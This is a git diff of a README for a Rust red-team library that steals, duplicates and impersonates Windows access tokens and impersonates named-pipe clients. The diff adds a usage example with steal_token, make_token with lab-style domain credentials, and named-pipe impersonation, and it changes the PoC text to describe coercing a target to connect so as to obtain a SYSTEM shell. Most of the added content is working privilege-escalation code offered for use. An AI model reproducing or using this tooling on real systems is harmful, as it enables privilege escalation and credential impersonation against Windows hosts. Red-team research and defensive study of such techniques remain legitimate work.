@@ -58,17 +58,85 @@ Create a named pipe, wait for the client process to connect to an instance of a 
 C:\Users\memN0ps\Documents\GitHub\arsenal-rs\token\target\debug\token.exe
 ```
 
-Run the following as administrator from a high integrity context to connect to an instance of a named pipe.
+Run the following as `NT AUTHORITY\SYSTEM` to connect to an instance of the named pipe or coerce a target to connect to you.
 ```
 echo "lol" > \\.\pipe\test
 ```
 
 You should now see a new SYSTEM shell. (PoC done).
 
+![](poc.png)
+
+
+## Usage Example
+
+```rust
+mod process;
+mod token;
+use crate::token::{make_token, set_token_privileges, steal_token};
+use token::{impersonate_named_pipe, impersonate_token, revert_to_self};
+use windows_sys::Win32::System::SystemServices::{
+    SE_ASSIGNPRIMARYTOKEN_NAME, SE_DEBUG_NAME, SE_IMPERSONATE_NAME,
+};
+mod privileges;
+
+fn main() {
+    env_logger::init();
+
+    match named_pipe_impersonation() {
+        Ok(_) => log::info!("named_pipe_impersonation success!"),
+        Err(e) => log::error!("Error: named_pipe_impersonation failed {:?}", e),
+    }
+
+    match token_magic_test() {
+        Ok(_) => log::info!("token_magic_test success!"),
+        Err(e) => log::error!("Error: token_magic_test failed {:?}", e),
+    }
+
+    match process_magic_test() {
+        Ok(_) => log::info!("process_magic_test success!"),
+        Err(e) => log::error!("Error: process_magic_test failed {:?}", e),
+    }
+}
+
+pub fn token_magic_test() -> Result<(), token::error::Error> {
+    set_token_privileges(SE_DEBUG_NAME, true)?;
+    set_token_privileges(SE_ASSIGNPRIMARYTOKEN_NAME, true)?;
+
+    let duplicate_token = steal_token(10608)?;
+    log::info!("{}", duplicate_token);
+    impersonate_token(duplicate_token)?;
+    revert_to_self()?;
+
+    let token = make_token("north.sevenkingdoms.local", "robb.stark", "sexywolfy")?;
+    log::info!("{}", token);
+    impersonate_token(token)?;
+    revert_to_self()?;
+
+    Ok(())
+}
+
+pub fn process_magic_test() -> Result<(), process::error::Error> {
+    let process_id = process::get_process_id_by_name("notepad.exe")?;
+    let module_id = process::get_module_address_by_name("kernel32.dll", process_id)?;
+
+    log::info!("process_id: {}", process_id);
+    log::info!("Module ID: {:x}", module_id);
+
+    Ok(())
+}
+
+pub fn named_pipe_impersonation() -> Result<(), token::error::Error> {
+    //set_token_privileges(SE_IMPERSONATE_NAME, true)?;
+    impersonate_named_pipe("test")?;
+    Ok(())
+}
+```
+
 ## Credits / References
 
 * [C5pider](https://twitter.com/C5pider): https://github.com/HavocFramework/Havoc
-* [zblurx](https://twitter.com/_zblurx): https://github.com/zblurx/impersonate-rs (Just saw this was done too. This one is much better than mine and actually usable)
+* [zblurx](https://twitter.com/_zblurx): https://github.com/zblurx/impersonate-rs (This is similar but does not have named pipe impersonation or make_token functionality. It's also a binary and not a library).
 * This project was dedicated to [@_RastaMouse](https://twitter.com/_RastaMouse)
 * https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/named-pipe-client-impersonation
 * https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/priv/namedpipe.c
